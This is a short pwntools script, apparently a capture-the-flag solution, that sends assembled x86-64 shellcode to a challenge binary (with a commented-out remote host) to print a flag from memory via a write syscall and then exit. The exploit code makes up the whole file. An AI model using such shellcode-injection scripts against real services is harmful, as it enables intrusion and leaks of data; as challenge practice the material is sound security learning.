from pwn import *
context.arch = "amd64"

# io = remote("amt.rs", 31174)
io = process("./chal")

payload = asm(f"""
	// write(1, flag_addr, 0x100)
	mov rdi, 1
	mov rsi, rax
	mov rdx, 0x100
	mov rax, 1
	syscall

    // exit(1)
	mov rdi, 1
	mov rax, 60
	syscall
""")

io.sendlineafter(b"> ", payload)

io.interactive()